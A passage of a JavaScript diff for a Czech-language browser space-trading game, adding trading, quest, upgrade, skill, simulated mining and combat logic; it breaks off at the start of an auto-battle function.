+            const buyDiv = document.getElementById('buyList');
+            const scroll = game.tradingScroll || 0;
+            const visible = planet.availableItems.slice(scroll, scroll + 10);
+            let buyHtml = '';
+            for (const item of visible) {
+                const price = planet.prices[item] || 0.1;
+                const stock = planet.goods[item] || 0;
+                const inStock = stock > 0;
+                const color = inStock ? '#ddd' : '#555';
+                const priceColor = price < 0.3 ? '#88dd88' : price < 0.8 ? '#e6e640' : '#dd6666';
+                buyHtml += `<div class="item-row" data-action="buy" data-item="${item}" style="cursor:${inStock?'pointer':'default'};color:${color};">
+                    <span class="name">${item}</span>
+                    <span class="qty">${inStock ? stock : '---'}</span>
+                    <span class="price" style="color:${priceColor}">${price.toFixed(4)} HVC</span>
+                </div>`;
+            }
+            buyDiv.innerHTML = buyHtml || '<div style="color:#666;padding:12px;">Zadne zbozi k dispozici</div>';
+
+            const sellDiv = document.getElementById('sellList');
+            const cargoScroll = game.cargoScroll || 0;
+            const cargoItems = Object.entries(ship.cargo);
+            const visibleSell = cargoItems.slice(cargoScroll, cargoScroll + 10);
+            let sellHtml = '';
+            for (const [item, amount] of visibleSell) {
+                const price = planet.prices[item] || 0.1;
+                const priceColor = price < 0.3 ? '#88dd88' : price < 0.8 ? '#e6e640' : '#dd6666';
+                sellHtml += `<div class="item-row sell" data-action="sell" data-item="${item}" style="cursor:pointer;">
+                    <span class="name">${item}</span>
+                    <span class="qty">${amount}x</span>
+                    <span class="price" style="color:${priceColor}">${price.toFixed(4)} HVC</span>
+                </div>`;
+            }
+            sellDiv.innerHTML = sellHtml || '<div style="color:#666;padding:12px;">Zadny naklad k prodeji</div>';
+
+            document.querySelectorAll('#buyList .item-row[data-action="buy"]').forEach(el => {
+                el.addEventListener('click', () => { buyItem(el.dataset.item); });
+            });
+            document.querySelectorAll('#sellList .item-row[data-action="sell"]').forEach(el => {
+                el.addEventListener('click', () => { sellItem(el.dataset.item); });
+            });
+        }
+
+        function buyItem(item) {
+            const planet = game.dockedPlanet;
+            if (!planet) return;
+            planet.updatePrices();
+            const price = planet.prices[item] || 0.1;
+            const stock = planet.goods[item] || 0;
+            const se = getSkillEffects();
+            const finalPrice = Math.max(0.0001, Math.round(price * (1 - se.barterBuy) * 10000) / 10000);
+
+            if (finalPrice <= 0.0001 || stock <= 0) {
+                showMessage('Polozka neni skladem!', 90);
+                return;
+            }
+            if (!planet.availableItems.includes(item)) {
+                showMessage('Tato polozka neni v nabidce!', 90);
+                return;
+            }
+            if (subtractCredits(finalPrice)) {
+                if (shipAddCargo(item, 1)) {
+                    planet.goods[item] = stock - 1;
+                    planet.recordTrade(item, 1);
+                    game.credits = walletBalance;
+                    showMessage(`Koupeno ${item} za ${finalPrice.toFixed(4)} HVC`, 90);
+                    saveGame();
+                    if (Math.random() < 0.3) planet.generateNewGoods();
+                    renderTrading();
+                    updateMenuWallet();
+                } else {
+                    addCredits(finalPrice);
+                    showMessage('Nedostatek mista v nakladu!', 90);
+                }
+            } else {
+                showMessage(`Nedostatek kreditu! Potreba: ${finalPrice.toFixed(4)} HVC`, 90);
+            }
+        }
+
+        function sellItem(item) {
+            const planet = game.dockedPlanet;
+            if (!planet) return;
+            if (!ship.cargo[item]) {
+                showMessage('Tato polozka neni v nakladu!', 90);
+                return;
+            }
+            planet.updatePrices();
+            const price = planet.prices[item] || 0.1;
+            const se = getSkillEffects();
+            const finalPrice = Math.max(0.0001, Math.round(price * (1 + se.barterSell) * 10000) / 10000);
+
+            if (finalPrice <= 0.0001) {
+                showMessage('Tato polozka nema cenu!', 90);
+                return;
+            }
+            if (shipRemoveCargo(item, 1)) {
+                addCredits(finalPrice);
+                planet.goods[item] = (planet.goods[item] || 0) + 1;
+                planet.recordTrade(item, -1);
+                game.credits = walletBalance;
+                showMessage(`Prodano ${item} za ${finalPrice.toFixed(4)} HVC`, 90);
+                saveGame();
+                if (Math.random() < 0.2) planet.generateNewGoods();
+                renderTrading();
+                updateMenuWallet();
+            } else {
+                showMessage('Chyba pri prodeji!', 90);
+            }
+        }
+
+        // --- Docked ---
+        function openDocked(planet) {
+            game.dockedPlanet = planet;
+            ship.dockedAt = planet.name;
+            game.state = 'DOCKED';
+            showScreen(dockedScreen);
+            document.getElementById('dockedTitle').textContent = `DOKOVANO U: ${planet.name}`;
+            document.getElementById('dockedType').textContent = `Typ: ${planet.getTypeName()}`;
+            let total = 0;
+            for (const k of Object.keys(planet.goods)) total += planet.goods[k];
+            document.getElementById('dockedInfo').textContent = `Zbozi: ${total} jednotek`;
+            document.getElementById('dockedShipStats').innerHTML =
+                `HP: ${Math.round(ship.hp)}/${ship.maxHp} | Shield: ${Math.round(ship.shield)}/${ship.maxShield} | Palivo: ${Math.round(ship.fuel)}/${ship.maxFuel} | Naklad: ${shipGetTotalCargo()}/${ship.maxCargo}`;
+        }
+
+        function closeDocked() {
+            if (game.dockedPlanet) {
+                const p = game.dockedPlanet;
+                const angle = rand(0, Math.PI * 2);
+                ship.x = p.x + 100 * Math.cos(angle);
+                ship.y = p.y + 100 * Math.sin(angle);
+                ship.dockedAt = null;
+                game.dockedPlanet = null;
+            }
+            game.state = 'GAME';
+            hideAllScreens();
+            showMessage('Odlet z stanice', 60);
+        }
+
+        // --- Quests ---
+        function openQuests() {
+            game.state = 'QUEST';
+            showScreen(questScreen);
+            renderQuests();
+        }
+
+        function renderQuests() {
+            const activeDiv = document.getElementById('questActive');
+            if (game.currentQuest) {
+                const q = game.currentQuest;
+                let progress = 0;
+                let progressText = '';
+                if (q.type === 'kill') {
+                    progress = game.questProgress.kill / q.amount;
+                    progressText = `${game.questProgress.kill}/${q.amount} piratskych lodi`;
+                } else if (q.type === 'deliver' || q.type === 'collect') {
+                    const has = ship.cargo[q.item] || 0;
+                    progress = has / q.amount;
+                    progressText = `${has}/${q.amount} ${q.item}`;
+                }
+                const pct = Math.min(1, progress);
+                const color = pct > 0.7 ? '#44ee88' : pct > 0.3 ? '#e6e640' : '#dd6666';
+                activeDiv.innerHTML = `
+                    <div style="font-size:18px;color:#44ee88;">AKTUALNI UKOL</div>
+                    <div style="font-size:16px;color:#ddd;margin:4px 0;">${q.name}</div>
+                    <div style="font-size:13px;color:#e6e640;">Odmena: ${q.reward.toFixed(4)} HVC</div>
+                    <div style="margin:6px 0;background:#222;border-radius:4px;height:16px;overflow:hidden;border:1px solid #444;">
+                        <div style="height:100%;width:${pct*100}%;background:${color};transition:width 0.3s;"></div>
+                    </div>
+                    <div style="font-size:13px;color:#aaa;">${progressText}</div>
+                    ${q.type === 'deliver' ? `<div style="font-size:12px;color:#88ccff;">Doruc z ${q.from} na ${q.to}</div>` : ''}
+                `;
+            } else {
+                activeDiv.innerHTML = '<div style="color:#666;padding:12px;">Neni aktivni ukol. Prijmi nejaky z nabidky!</div>';
+            }
+
+            const listDiv = document.getElementById('questList');
+            let html = '';
+            for (let i = 0; i < game.quests.length; i++) {
+                const q = game.quests[i];
+                const typeColor = q.type === 'deliver' ? '#44ee88' : q.type === 'collect' ? '#e6e640' : '#dd6666';
+                html += `<div class="item-row" data-action="acceptQuest" data-index="${i}" style="cursor:pointer;flex-wrap:wrap;">
+                    <span class="name">[${i+1}] ${q.name}</span>
+                    <span style="color:${typeColor};font-size:12px;">${q.type.toUpperCase()}</span>
+                    <span style="color:#88dd88;font-size:12px;">${q.reward.toFixed(4)} HVC</span>
+                    ${q.type === 'deliver' ? `<span style="color:#888;font-size:11px;">→ ${q.to}</span>` : ''}
+                </div>`;
+            }
+            listDiv.innerHTML = html || '<div style="color:#666;padding:12px;">Zadne dalsi ukoly nejsou k dispozici.</div>';
+
+            document.querySelectorAll('#questList .item-row[data-action="acceptQuest"]').forEach(el => {
+                el.addEventListener('click', () => {
+                    const idx = parseInt(el.dataset.index);
+                    acceptQuest(idx);
+                });
+            });
+        }
+
+        function acceptQuest(index) {
+            if (index < 0 || index >= game.quests.length) return;
+            game.currentQuest = game.quests.splice(index, 1)[0];
+            game.questProgress.kill = 0;
+            game.questProgress.collect = 0;
+            showMessage(`Prijat ukol: ${game.currentQuest.name}`, 120);
+            renderQuests();
+        }
+
+        function checkQuestCompletion(planet) {
+            if (!game.currentQuest) return;
+            const q = game.currentQuest;
+            let completed = false;
+
+            if (q.type === 'deliver') {
+                if (planet && planet.name === q.to) {
+                    const has = ship.cargo[q.item] || 0;
+                    if (has >= q.amount) {
+                        for (let i = 0; i < q.amount; i++) shipRemoveCargo(q.item, 1);
+                        completed = true;
+                        showMessage(`Doruceni ${q.item} na ${q.to} uspesne!`, 90);
+                    } else {
+                        showMessage(`Potrebujete ${q.amount - has} vice ${q.item}`, 60);
+                    }
+                }
+            } else if (q.type === 'collect') {
+                const has = ship.cargo[q.item] || 0;
+                if (has >= q.amount) {
+                    completed = true;
+                    showMessage(`Sber ${q.item} dokoncen!`, 90);
+                }
+            } else if (q.type === 'kill') {
+                if (game.questProgress.kill >= q.amount) {
+                    completed = true;
+                    showMessage('Vsechny piratske lodi zniceny!', 90);
+                }
+            }
+
+            if (completed) {
+                addCredits(q.reward);
+                game.credits = walletBalance;
+                showMessage(`Ukol splnen! Ziskano: ${q.reward.toFixed(4)} HVC`, 120);
+                game.currentQuest = null;
+                game.questProgress = { kill: 0, collect: 0 };
+                saveGame();
+                updateMenuWallet();
+                renderQuests();
+            }
+        }
+
+        // --- Upgrades ---
+        function openUpgrades() {
+            game.state = 'UPGRADE';
+            showScreen(upgradeScreen);
+            renderUpgrades();
+        }
+
+        function renderUpgrades() {
+            const statsDiv = document.getElementById('upgradeStats');
+            statsDiv.innerHTML = `
+                <div>Jmeno: ${ship.name}</div>
+                <div>Level: ${ship.level}</div>
+                <div>HP: ${Math.round(ship.hp)}/${ship.maxHp}</div>
+                <div>Shield: ${Math.round(ship.shield)}/${ship.maxShield}</div>
+                <div>Rychlost: ${ship.maxSpeed.toFixed(1)}</div>
+                <div>Naklad: ${shipGetTotalCargo()}/${ship.maxCargo}</div>
+                <div>Palivo: ${Math.round(ship.fuel)}/${ship.maxFuel}</div>
+                <div>Zbrane: ${ship.weapons.join(', ')}</div>
+                <div style="color:#88dd88;margin-top:4px;">Kredity: ${walletBalance.toFixed(4)} HVC</div>
+            `;
+
+            const listDiv = document.getElementById('upgradeList');
+            const upgrades = [
+                { id: 'hp', name: 'Posileni trupu (+20 HP)', cost: 0.15 + 0.05 * (ship.maxHp / 10),
+                desc: 'Zvysi maximalni HP o 20' },
+                { id: 'shield', name: 'Stity (+20)', cost: 0.12 + 0.04 * (ship.maxShield / 10),
+                desc: 'Zvysi maximalni stity o 20' },
+                { id: 'speed', name: 'Rychlost (+0.5)', cost: 0.10 + 0.03 * (ship.maxSpeed - 4.5),
+                    desc: 'Zvysi maximalni rychlost' },
+                { id: 'cargo', name: 'Naklad (+20)', cost: 0.18 + 0.06 * (ship.maxCargo / 10),
+                desc: 'Zvysi maximalni naklad' },
+                { id: 'fuel', name: 'Max palivo (+50)', cost: 0.10 + 0.03 * (ship.maxFuel / 10),
+                desc: 'Zvysi maximalni palivo' },
+            ];
+
+            let html = '';
+            for (const up of upgrades) {
+                const canAfford = walletBalance >= up.cost;
+                const color = canAfford ? '#ddd' : '#555';
+                const borderColor = canAfford ? '#3a8acc' : '#553333';
+                html += `<div class="item-row" data-action="doUpgrade" data-id="${up.id}" data-cost="${up.cost}" style="cursor:${canAfford?'pointer':'default'};border-color:${borderColor};color:${color};">
+                    <span class="name">${up.name}</span>
+                    <span style="color:${canAfford?'#88dd88':'#666'};">${up.cost.toFixed(4)} HVC</span>
+                    <span style="font-size:11px;color:#888;">${up.desc}</span>
+                </div>`;
+            }
+            listDiv.innerHTML = html;
+
+            document.querySelectorAll('#upgradeList .item-row[data-action="doUpgrade"]').forEach(el => {
+                el.addEventListener('click', () => {
+                    const id = el.dataset.id;
+                    const cost = parseFloat(el.dataset.cost);
+                    doUpgrade(id, cost);
+                });
+            });
+        }
+
+        function doUpgrade(id, cost) {
+            if (!subtractCredits(cost)) {
+                showMessage('Nedostatek kreditu!', 90);
+                return;
+            }
+            game.credits = walletBalance;
+            updateMenuWallet();
+
+            if (id === 'hp') { ship.maxHp += 20;
+                ship.hp = Math.min(ship.hp + 20, ship.maxHp); } else if (id === 'shield') { ship.maxShield += 20;
+                ship.shield = Math.min(ship.shield + 20, ship.maxShield); } else if (id === 'speed') { ship.maxSpeed +=
+                0.5; } else if (id === 'cargo') { ship.maxCargo += 20; } else if (id === 'fuel') { ship.maxFuel += 50;
+                ship.fuel = Math.min(ship.fuel + 50, ship.maxFuel); }
+
+            showMessage(`Vylepseni zakoupeno za ${cost.toFixed(4)} HVC`, 90);
+            saveGame();
+            renderUpgrades();
+            updatePassiveBonuses();
+        }
+
+        // --- Fuel ---
+        function openFuel() {
+            game.state = 'FUEL';
+            showScreen(fuelScreen);
+            document.getElementById('fuelCurrent').textContent =
+                `Aktualni palivo: ${Math.round(ship.fuel)}/${ship.maxFuel}`;
+        }
+
+        function buyFuel(amount) {
+            const cost = amount * 0.005;
+            if (subtractCredits(cost)) {
+                ship.fuel = Math.min(ship.maxFuel, ship.fuel + amount);
+                game.credits = walletBalance;
+                showMessage(`Nakoupeno ${amount} paliva za ${cost.toFixed(4)} HVC`, 90);
+                saveGame();
+                updateMenuWallet();
+                document.getElementById('fuelCurrent').textContent =
+                    `Aktualni palivo: ${Math.round(ship.fuel)}/${ship.maxFuel}`;
+            } else {
+                showMessage('Nedostatek kreditu!', 90);
+            }
+        }
+
+        // --- Skills ---
+        function openSkills() {
+            game.state = 'SKILLS';
+            showScreen(skillsScreen);
+            renderSkills();
+        }
+
+        function renderSkills() {
+            document.getElementById('skillPoints').textContent = `Volnych bodu: ${ship.skillPoints}`;
+            const listDiv = document.getElementById('skillList');
+            let html = '';
+            let idx = 1;
+            for (const [id, def] of Object.entries(SKILL_DEFS)) {
+                const val = ship.skills[id] || 0;
+                const maxed = val >= def.max;
+                const canAdd = ship.skillPoints > 0 && !maxed;
+                html += `<div class="item-row" data-action="addSkill" data-id="${id}" style="cursor:${canAdd?'pointer':'default'};border-color:${canAdd?'#3a8acc':'#333'};">
+                    <span class="name">[${idx}] ${def.icon} ${def.name}</span>
+                    <span style="color:${maxed?'#88dd88':'#ddd'};">${val}/${def.max}</span>
+                    <span style="font-size:11px;color:#888;">${def.desc}</span>
+                    ${canAdd ? '<span style="color:#44ee88;font-size:12px;">+</span>' : ''}
+                </div>`;
+                idx++;
+            }
+            listDiv.innerHTML = html;
+
+            document.querySelectorAll('#skillList .item-row[data-action="addSkill"]').forEach(el => {
+                el.addEventListener('click', () => {
+                    const id = el.dataset.id;
+                    addSkill(id);
+                });
+            });
+        }
+
+        function addSkill(id) {
+            if (ship.skillPoints <= 0) {
+                showMessage('Nemate volne skill body!', 90);
+                return;
+            }
+            if (ship.skills[id] >= SKILL_DEFS[id].max) {
+                showMessage(`Skill ${SKILL_DEFS[id].name} je na maximu!`, 90);
+                return;
+            }
+            ship.skills[id]++;
+            ship.skillPoints--;
+            updatePassiveBonuses();
+            showMessage(`${SKILL_DEFS[id].name}: ${ship.skills[id]}/${SKILL_DEFS[id].max}`, 90);
+            renderSkills();
+            saveGame();
+        }
+
+        // --- Mining (herní, asteroidy) ---
+        function toggleMining() {
+            if (game.miningActive) {
+                stopMining();
+                return;
+            }
+
+            let nearAsteroid = null;
+            for (const a of game.asteroids) {
+                if (!a.mined && dist(ship, a) < a.radius + 50) {
+                    nearAsteroid = a;
+                    break;
+                }
+            }
+
+            if (nearAsteroid) {
+                game.asteroidMiningTarget = nearAsteroid;
+                game.asteroidMiningShares = 0;
+                game.asteroidMiningActive = true;
+                game.miningActive = true;
+                game.miningStats.startTime = Date.now();
+                game.miningStats.hashCount = 0;
+                game.miningStats.shareCount = 0;
+                game.miningStats.totalEarned = 0;
+                game.miningStats.maxHashrate = 0;
+                showMessage(`⛏ Tezeni asteroidu: ${nearAsteroid.oreType} (0/${nearAsteroid.sharesNeeded})`, 120);
+                return;
+            }
+
+            if (!walletAddress) createWallet();
+            game.miningActive = true;
+            game.asteroidMiningActive = false;
+            game.asteroidMiningTarget = null;
+            game.miningStats.startTime = Date.now();
+            game.miningStats.hashCount = 0;
+            game.miningStats.shareCount = 0;
+            game.miningStats.totalEarned = 0;
+            game.miningStats.maxHashrate = 0;
+            game.miningSessionHashes = 0;
+            game.miningSessionShares = 0;
+            game.miningTimer = 0;
+            showMessage('⛏ Mining HVC spusten! [K] pro zastaveni', 90);
+        }
+
+        function stopMining() {
+            if (!game.miningActive) return;
+
+            if (game.asteroidMiningActive && game.asteroidMiningTarget) {
+                const target = game.asteroidMiningTarget;
+                if (target.sharesMined >= target.sharesNeeded) {
+                    const ore = target.oreType;
+                    const amount = target.oreAmount;
+                    if (shipAddCargo(ore, amount)) {
+                        showMessage(`✅ Asteroid vytěžen! Zisk: ${amount}x ${ore}`, 120);
+                        target.mined = true;
+                        for (let i = 0; i < amount; i++) {
+                            game.floatingItems.push({
+                                name: ore,
+                                category: 'Minerály',
+                                x: target.x + rand(-20, 20),
+                                y: target.y + rand(-20, 20),
+                                time: Date.now()
+                            });
+                        }
+                        if (!game.inventory.cargo[ore]) game.inventory.cargo[ore] = 0;
+                        game.inventory.cargo[ore] += amount;
+                        if (!game.inventory.cargo['Komponenty']) game.inventory.cargo['Komponenty'] = 0;
+                        game.inventory.cargo['Komponenty'] += Math.floor(amount / 2) + 1;
+
+                        respawnAsteroid(target);
+                        game.asteroidMiningTarget = null;
+                        game.asteroidMiningActive = false;
+                        game.miningActive = false;
+                        saveGame();
+                    } else {
+                        showMessage('❌ Naklad je plny! Asteroid nelze vytěžit.', 120);
+                        game.asteroidMiningActive = false;
+                        game.miningActive = false;
+                    }
+                    return;
+                } else {
+                    showMessage(`⏳ Tezeni preruseno: ${target.sharesMined}/${target.sharesNeeded}`, 90);
+                }
+                game.miningActive = false;
+                game.asteroidMiningActive = false;
+                game.asteroidMiningTarget = null;
+                return;
+            }
+
+            game.miningActive = false;
+            const elapsed = (Date.now() - game.miningStats.startTime) / 1000;
+            const earned = game.miningStats.totalEarned;
+
+            if (game.miningStats.hashCount > 0) {
+                const session = {
+                    timestamp: Date.now(),
+                    duration: elapsed,
+                    hashes: game.miningStats.hashCount,
+                    shares: game.miningStats.shareCount,
+                    earned: earned,
+                    efficiency: game.miningStats.shareCount / game.miningStats.hashCount * 100 || 0,
+                    avgHashrate: game.miningStats.hashCount / elapsed || 0,
+                    maxHashrate: game.miningStats.maxHashrate,
+                };
+                game.miningHistory.unshift(session);
+                if (game.miningHistory.length > 20) game.miningHistory.pop();
+            }
+
+            if (earned > 0) {
+                addCredits(earned);
+                game.credits = walletBalance;
+                updateMenuWallet();
+                saveGame();
+            }
+
+            showMessage(`⛏ Mining ukoncen! Ziskano: ${earned.toFixed(8)} HVC`, 180);
+            game.miningStats.hashrate = 0;
+            game.displayedHashrate = 0;
+        }
+
+        function respawnAsteroid(asteroid) {
+            let x, y, valid;
+            let attempts = 0;
+            do {
+                x = rand(200, WORLD_W - 200);
+                y = rand(200, WORLD_H - 200);
+                valid = true;
+                for (const p of game.planets) {
+                    if (dist({ x, y }, p) < 250) { valid = false; break; }
+                }
+                for (const a of game.asteroids) {
+                    if (a !== asteroid && dist({ x, y }, a) < 60) { valid = false; break; }
+                }
+                attempts++;
+            } while (!valid && attempts < 50);
+            asteroid.x = x;
+            asteroid.y = y;
+            asteroid.mined = false;
+            asteroid.sharesMined = 0;
+            asteroid.hp = 50;
+            asteroid.radius = rand(12, 32);
+            asteroid.oreType = game.asteroidOreTypes[randInt(0, game.asteroidOreTypes.length - 1)];
+            asteroid.oreAmount = randInt(1, 4);
+            asteroid.vertices = (() => {
+                const v = [];
+                const n = randInt(6, 10);
+                for (let i = 0; i < n; i++) {
+                    const angle = (i / n) * Math.PI * 2 + rand(-0.3, 0.3);
+                    const dist2 = asteroid.radius * rand(0.7, 1.0);
+                    v.push({ angle, dist: dist2 });
+                }
+                return v;
+            })();
+        }
+
+        function updateMining() {
+            if (!game.miningActive) return;
+
+            if (game.asteroidMiningActive && game.asteroidMiningTarget) {
+                const target = game.asteroidMiningTarget;
+                if (target.mined) {
+                    game.asteroidMiningActive = false;
+                    game.miningActive = false;
+                    game.asteroidMiningTarget = null;
+                    showMessage('Asteroid jiz byl vytěžen.', 90);
+                    return;
+                }
+                if (dist(ship, target) > target.radius + 60) {
+                    showMessage('Příliš daleko od asteroidu! Tezeni preruseno.', 90);
+                    game.asteroidMiningActive = false;
+                    game.miningActive = false;
+                    game.asteroidMiningTarget = null;
+                    return;
+                }
+                target.sharesMined++;
+                target.hp = Math.max(0, target.hp - 1);
+                const pct = Math.round((target.sharesMined / target.sharesNeeded) * 100);
+                if (target.sharesMined % 5 === 0 || target.sharesMined === target.sharesNeeded) {
+                    showMessage(`⛏ Tezeni: ${pct}% (${target.sharesMined}/${target.sharesNeeded})`, 60);
+                }
+                if (target.sharesMined >= target.sharesNeeded) {
+                    const ore = target.oreType;
+                    const amount = target.oreAmount;
+                    if (shipAddCargo(ore, amount)) {
+                        showMessage(`✅ Asteroid vytěžen! Zisk: ${amount}x ${ore}`, 120);
+                        target.mined = true;
+                        for (let i = 0; i < amount; i++) {
+                            game.floatingItems.push({
+                                name: ore,
+                                category: 'Minerály',
+                                x: target.x + rand(-20, 20),
+                                y: target.y + rand(-20, 20),
+                                time: Date.now()
+                            });
+                        }
+                        if (!game.inventory.cargo[ore]) game.inventory.cargo[ore] = 0;
+                        game.inventory.cargo[ore] += amount;
+                        if (!game.inventory.cargo['Komponenty']) game.inventory.cargo['Komponenty'] = 0;
+                        game.inventory.cargo['Komponenty'] += Math.floor(amount / 2) + 1;
+                        respawnAsteroid(target);
+                        game.asteroidMiningTarget = null;
+                        game.asteroidMiningActive = false;
+                        game.miningActive = false;
+                        saveGame();
+                    } else {
+                        showMessage('❌ Naklad je plny! Asteroid nelze vytěžit.', 120);
+                        game.asteroidMiningActive = false;
+                        game.miningActive = false;
+                    }
+                }
+                return;
+            }
+
+            const now = Date.now();
+            const elapsed = (now - game.miningStats.startTime) / 1000;
+            const hashrate = 2000 + Math.random() * 3000;
+            game.displayedHashrate = game.displayedHashrate * 0.9 + hashrate * 0.1;
+            game.miningStats.hashrate = game.displayedHashrate;
+            game.miningStats.hashCount += Math.floor(hashrate / 60);
+
+            if (Math.random() < 0.01) {
+                game.miningStats.shareCount++;
+                game.miningSessionShares++;
+                const shareReward = 0.00005 + Math.random() * 0.00015;
+                game.miningStats.totalEarned += shareReward;
+                if (game.miningStats.shareCount % 5 === 0) {
+                    addCredits(shareReward * 5);
+                    game.credits = walletBalance;
+                    updateMenuWallet();
+                }
+            }
+            game.miningStats.difficulty = 6000000 + Math.floor(Math.random() * 100000);
+            if (game.displayedHashrate > game.miningStats.maxHashrate) {
+                game.miningStats.maxHashrate = game.displayedHashrate;
+            }
+        }
+
+        function openMiningLog() {
+            game.state = 'MINING_LOG';
+            showScreen(miningLogScreen);
+            renderMiningLog();
+        }
+
+        function renderMiningLog() {
+            const overallDiv = document.getElementById('miningOverall');
+            if (game.miningHistory.length > 0) {
+                const totalMined = game.miningHistory.reduce((s, h) => s + h.earned, 0);
+                const totalHashes = game.miningHistory.reduce((s, h) => s + h.hashes, 0);
+                const totalShares = game.miningHistory.reduce((s, h) => s + h.shares, 0);
+                const avgEff = game.miningHistory.reduce((s, h) => s + h.efficiency, 0) / game.miningHistory.length;
+                overallDiv.innerHTML = `
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px 20px;">
+                        <div class="mining-stat">Sessions: <span class="highlight">${game.miningHistory.length}</span></div>
+                        <div class="mining-stat">Total Mined: <span class="highlight2">${totalMined.toFixed(8)} HVC</span></div>
+                        <div class="mining-stat">Total Hashes: <span class="highlight">${totalHashes.toLocaleString()}</span></div>
+                        <div class="mining-stat">Total Shares: <span class="highlight">${totalShares}</span></div>
+                        <div class="mining-stat">Avg Efficiency: <span class="highlight2">${avgEff.toFixed(4)}%</span></div>
+                        <div class="mining-stat">Wallet: <span class="highlight">${walletBalance.toFixed(8)} HVC</span></div>
+                    </div>
+                `;
+            } else {
+                overallDiv.innerHTML = '<div style="color:#666;padding:12px;">Zatim zadne mining session.</div>';
+            }
+
+            const sessionsDiv = document.getElementById('miningSessions');
+            let html = '';
+            for (const s of game.miningHistory.slice(0, 10)) {
+                const time = new Date(s.timestamp).toLocaleTimeString();
+                html += `<div style="display:flex;justify-content:space-between;padding:4px 8px;background:rgba(10,10,30,0.3);border-bottom:1px solid #1a1a3a;font-size:13px;color:#aaa;flex-wrap:wrap;">
+                    <span>${time}</span>
+                    <span>${s.duration.toFixed(1)}s</span>
+                    <span>${s.hashes.toLocaleString()} H</span>
+                    <span>${s.shares} sh</span>
+                    <span style="color:#88dd88;">${s.earned.toFixed(8)} HVC</span>
+                    <span style="color:#888;">${s.efficiency.toFixed(2)}%</span>
+                </div>`;
+            }
+            sessionsDiv.innerHTML = html || '<div style="color:#666;padding:12px;">Zadne session k zobrazeni.</div>';
+        }
+
+        // --- Combat ---
+        function fireWeapon() {
+            if (ship.lastShot > 0) return;
+            ship.lastShot = ship.shootDelay;
+            const bx = ship.x + Math.cos(ship.direction) * 22;
+            const by = ship.y + Math.sin(ship.direction) * 22;
+            const bvx = Math.cos(ship.direction) * 8;
+            const bvy = Math.sin(ship.direction) * 8;
+            game.bullets.push({ x: bx, y: by, vx: bvx, vy: bvy, life: 60 });
+        }
+
+        function updateBullets() {
+            for (let i = game.bullets.length - 1; i >= 0; i--) {
+                const b = game.bullets[i];
+                b.x += b.vx;
+                b.y += b.vy;
+                b.life--;
+                if (b.life <= 0) {
+                    game.bullets.splice(i, 1);
+                    continue;
+                }
+                let hit = false;
+                for (let j = game.enemies.length - 1; j >= 0; j--) {
+                    const e = game.enemies[j];
+                    if (dist(b, e) < e.size) {
+                        const se = getSkillEffects();
+                        const damage = Math.floor(30 * (1 + se.damagePct + (ship.appliedBonuses.damagePct || 0)));
+                        e.hp -= damage;
+                        if (e.hp <= 0) {
+                            game.enemies.splice(j, 1);
+                            ship.xp += 60;
+                            spawnFloatingItem(e.x, e.y);
+                            if (game.currentQuest && game.currentQuest.type === 'kill') {
+                                game.questProgress.kill++;
+                                checkQuestCompletion(null);
+                            }
+                            while (ship.xp >= ship.xpToLevel) {
+                                ship.xp -= ship.xpToLevel;
+                                ship.level++;
+                                ship.skillPoints++;
+                                ship.xpToLevel = 100 + (ship.level - 1) * 25;
+                                showMessage(`Level up! Level ${ship.level} (+1 skill bod)`, 120);
+                            }
+                            if (game.autoBattle && game.autoBattleTarget === e) {
+                                game.autoBattle = false;
+                                game.autoBattleTarget = null;
+                                showMessage('Vitezstvi! Nepritel znicen!', 120);
+                            }
+                            if (game.asteroids.length > 0) {
+                                const ref = game.asteroids.filter(a => !a.mined);
+                                if (ref.length > 0) {
+                                    const r = ref[randInt(0, ref.length - 1)];
+                                    const angle = rand(0, Math.PI * 2);
+                                    const d = rand(100, 300);
+                                    const nx = clamp(r.x + d * Math.cos(angle), 100, WORLD_W - 100);
+                                    const ny = clamp(r.y + d * Math.sin(angle), 100, WORLD_H - 100);
+                                    const isElite = Math.random() < 0.12;
+                                    game.enemies.push(createEnemy(nx, ny, isElite ? 'Elite' : 'Pirate'));
+                                }
+                            }
+                            saveGame();
+                        }
+                        hit = true;
+                        break;
+                    }
+                }
+                if (hit) {
+                    game.bullets.splice(i, 1);
+                }
+            }
+
+            for (let i = game.enemyBullets.length - 1; i >= 0; i--) {
+                const b = game.enemyBullets[i];
+                b.x += b.vx;
+                b.y += b.vy;
+                b.life--;
+                if (b.life <= 0) {
+                    game.enemyBullets.splice(i, 1);
+                    continue;
+                }
+                if (dist(b, ship) < 16) {
+                    let dmg = b.damage || 10;
+                    if (ship.shield > 0) {
+                        if (ship.shield >= dmg) { ship.shield -= dmg;
+                            dmg = 0; } else { dmg -= ship.shield;
+                            ship.shield = 0; }
+                    }
+                    ship.hp -= dmg;
+                    game.enemyBullets.splice(i, 1);
+                    if (ship.hp <= 0) {
+                        playerRespawn();
+                    }
+                }
+            }
+        }
+
+        function spawnFloatingItem(x, y) {
+            const cats = Object.keys(ITEM_CATEGORIES);
+            const cat = cats[randInt(0, cats.length - 1)];
+            const items = ITEM_CATEGORIES[cat];
+            const name = items[randInt(0, items.length - 1)];
+            game.floatingItems.push({ name, category: cat, x, y, time: Date.now() });
+        }
+
+        function playerRespawn() {
+            ship.hp = ship.maxHp;
+            ship.shield = ship.maxShield;
+            let nearest = null,
+                nearDist = Infinity;
+            for (const p of game.planets) {
+                if (['PLANET', 'DOCKY', 'OBCHODNI_STANICE'].includes(p.stationType)) {
+                    const d = dist(ship, p);
+                    if (d < nearDist) { nearDist = d;
+                        nearest = p; }
+                }
+            }
+            if (nearest) {
+                ship.x = nearest.x + 50;
+                ship.y = nearest.y + 50;
+                game.cameraX = ship.x;
+                game.cameraY = ship.y;
+            }
+            showMessage('💀 Lod znicena! Obnoveno na nejblizsi stanici.', 180);
+            game.autoBattle = false;
+            game.autoBattleTarget = null;
+            saveGame();
+        }
+
+        // --- Auto Battle ---
+        function toggleAutoBattle() {
+            if (game.autoBattle) {
+                game.autoBattle = false;
+                game.autoBattleTarget = null;
+                showMessage('Auto-battle ukoncen!', 60);
+                return;
+            }
+            let closest = null,
+                closeDist = 400;
+            for (const e of game.enemies) {
+                const d = dist(ship, e);
+                if (d < closeDist) { closeDist = d;
+                    closest = e; }
+            }
+            if (closest) {
+                game.autoBattle = true;
+                game.autoBattleTarget = closest;
+                showMessage('⚔ AUTO-BATTLE aktivni! [E] ukoncit', 90);
+            } else {
+                showMessage('Zadny nepritele v dosahu!', 60);
+            }
+        }
+
+        function updateAutoBattle() {
